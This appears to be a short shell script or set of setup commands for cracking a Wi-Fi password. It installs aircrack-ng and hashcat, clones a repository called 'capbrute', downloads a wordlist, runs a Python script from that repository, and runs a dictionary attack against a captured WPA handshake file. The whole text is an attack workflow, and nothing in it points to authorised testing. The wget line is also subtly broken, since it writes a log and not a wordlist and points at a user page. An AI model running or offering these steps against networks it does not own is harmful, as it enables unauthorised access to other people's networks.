sudo apt update -y
sudo apt install aircrack-ng python3 hashcat nano -y
git clone https://github.com/ikinre/capbrute.git cap
wget https://github.com/kkrypt0 -o wordlist.txt
cd cap
python3 hy.py
aircrack-ng -w *txt handshake.cap
